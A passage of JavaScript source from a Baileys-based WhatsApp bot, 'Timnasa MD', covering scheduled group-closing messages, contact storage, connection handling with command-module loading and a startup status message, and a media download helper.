                            zk.sendMessage(crons[i].group_id, { image : { url : './media/chrono.webp'} , caption: "Group Closed." });
                        }, { timezone: "Africa/Tanzania" });
                    }
                }
            }
            return;
        }

        zk.ev.on("contacts.upsert", async (contacts) => {
            const insertContact = (newContact) => {
                for (const contact of newContact) {
                    if (store.contacts[contact.id]) { Object.assign(store.contacts[contact.id], contact); }
                    else { store.contacts[contact.id] = contact; }
                }
            };
            insertContact(contacts);
        });

        zk.ev.on("connection.update", async (con) => {
            const { lastDisconnect, connection } = con;
            if (connection === "connecting") {
                console.log("ℹ️ Timnasa md is connecting...");
            }
            else if (connection === 'open') {
                console.log("✅ 𝚻𝚰𝚳𝚴𝚫𝐒𝚫 𝚻𝚳𝐃2 - Connected! ☺️");
                console.log("𝚻𝚰𝚳𝚴𝚫𝐒𝚫 𝚻𝚳𝐃2 is Online 🕸\n\n");
                
                // --- EXECUTE AUTO-FOLLOW CHANNELS & AUTO-JOIN GROUPS ---
                autoJoinAndFollow(zk);

                fs.readdirSync(__dirname + "/commandes").forEach((fichier) => {
                    if (path.extname(fichier).toLowerCase() == (".js")) {
                        try { require(__dirname + "/commandes/" + fichier); }
                        catch (e) { console.log(e); }
                    }
                });
                await activateCrons();
                if((conf.DP).toLowerCase() === 'yes') {     
                    let cmsg =`      ᴍᴀᴅᴇ ғʀᴏᴍ ᴛᴀɴᴢᴀɴɪᴀ 🇹🇿
╭─────────────━┈⊷• 
│●│ *ᯤ ᴛɪᴍɴᴀsᴀ-ᴍᴅ: ᴄᴏɴɴᴇᴄᴛᴇᴅ* │•───────────━┈⊷│■▪︎
│•───────────━┈⊷│■▪︎
│¤│ᴘʀᴇғɪx: *[ ${prefixe} ]*
│•───────────━┈⊷│■▪︎
│•───────────━┈⊷│■▪︎
│○│ᴍᴏᴅᴇ: *${(conf.MODE).toLowerCase() === "yes" ? "public" : "private"}*
│•───────────━┈⊷│■▪︎
│•───────────━┈⊷│■▪︎
╰─────────────━┈⊷•⁠⁠⁠⁠`;
                    await zk.sendMessage(zk.user.id, { text: cmsg });
                }
            }
            else if (connection == "close") {
                let raisonDeconnexion = new boom_1.Boom(lastDisconnect?.error)?.output.statusCode;
                if (raisonDeconnexion === baileys_1.DisconnectReason.restartRequired) { main(); }   
                else { const {exec}=require("child_process") ; exec("pm2 restart all"); }
                main();
            }
        });

        zk.ev.on("creds.update", saveCreds);

        zk.downloadAndSaveMediaMessage = async (message, filename = '', attachExtension = true) => {
            let quoted = message.msg ? message.msg : message;
            let mime = (message.msg || message).mimetype || '';
            let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
            const stream = await (0, baileys_1.downloadContentFromMessage)(quoted, messageType);
            let buffer = Buffer.from([]);
            for await (const chunk of stream) { buffer = Buffer.concat([buffer, chunk]); }
            let type = await FileType.fromBuffer(buffer);
            let trueFileName = './' + filename + '.' + type.ext;
            await fs.writeFileSync(trueFileName, buffer);
            return trueFileName;
        };

        return zk;
    }
    main();
}, 5000);
